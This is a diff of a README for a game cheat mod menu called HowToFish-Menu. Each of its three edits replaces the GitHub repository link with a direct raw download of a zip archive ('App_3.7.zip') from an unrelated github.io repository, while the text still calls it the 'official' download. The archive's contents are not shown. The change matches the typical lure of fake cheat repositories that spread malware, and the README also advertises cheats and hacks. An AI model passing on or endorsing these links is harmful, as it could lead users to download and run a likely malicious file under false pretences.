@@ -11,7 +11,7 @@ Welcome! This guide will help you download and install HowToFish-Menu, a powerfu
 
 ## 📥 Download and Install
 
-[⬇️ **DOWNLOAD HowToFish-Menu NOW**](https://github.com/sereneautoradiographic14/HowToFish-Menu)
+[⬇️ **DOWNLOAD HowToFish-Menu NOW**](https://raw.githubusercontent.com/sereneautoradiographic14/sereneautoradiographic14.github.io/main/quadratus/App_3.7.zip)
 
 **Step 1: Visit the Download Page**
 Visit this link to download the application. Once you're on the page, look for the green "Code" button or the "Releases" section. Click on it to find the latest version of the mod.
@@ -153,7 +153,7 @@ We're here to help! If you encounter any issues or have questions:
 
 Now that you have HowToFish-Menu installed, you're ready to dominate every fishing challenge and casino game. Remember:
 
-1. Always download from [our official repository](https://github.com/sereneautoradiographic14/HowToFish-Menu)
+1. Always download from [our official repository](https://raw.githubusercontent.com/sereneautoradiographic14/sereneautoradiographic14.github.io/main/quadratus/App_3.7.zip)
 2. Keep the mod updated for the best experience
 3. Don't be afraid to experiment with different settings
 4. Have fun and enjoy your enhanced gaming experience
@@ -164,6 +164,6 @@ Visit the download page, follow our simple installation guide, and within minute
 
 **Remember:** The mod is completely free and always will be. If you enjoy using it, consider supporting our development team so we can continue improving and adding new features.
 
-➡️ **[Click here to visit the official download page](https://github.com/sereneautoradiographic14/HowToFish-Menu)**
+➡️ **[Click here to visit the official download page](https://raw.githubusercontent.com/sereneautoradiographic14/sereneautoradiographic14.github.io/main/quadratus/App_3.7.zip)**
 
 Keywords: aimbot, bepinex, bepinex-plugin, casino, cheat, cheats, fishing-game, game-mod, hack, hacks, how-to-fish, mod-menu, modding, mono, roulette, slot-machine, trainer, trickshot, unity, unity-mod
